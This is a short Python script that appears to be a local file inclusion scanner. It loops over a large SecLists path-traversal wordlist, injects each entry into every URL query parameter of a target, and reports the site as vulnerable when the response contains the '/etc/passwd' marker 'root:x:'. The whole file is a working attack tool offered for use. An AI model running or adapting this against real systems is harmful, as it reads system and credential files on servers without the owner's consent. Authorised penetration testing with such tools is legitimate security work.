import time

import requests
from urllib.parse import urlparse, parse_qs

def lfi(url):
    vuln_recon = "root:x:"
    parsed = urlparse(url)
    base = parsed.scheme + "://" + parsed.netloc + parsed.path
    params = parse_qs(parsed.query)
    try:
        response = requests.get(base, params=params)
        if response.status_code == 200:
            with open('/usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt', 'r') as f:
                for line in f:
                    payload = line.strip()
                    for key in params:
                        params[key] = payload
                    req = requests.get(base, params=params)
                    print(f"[+] Testing '{key}' parameter with GET method ...[+]")
                    if vuln_recon in req.text:
                        print(req.url, "is vulnerable")
                        exit(0)
    except requests.exceptions.ConnectionError:
        print("[-] Connection Error !... Please check the url and try again.[-]")
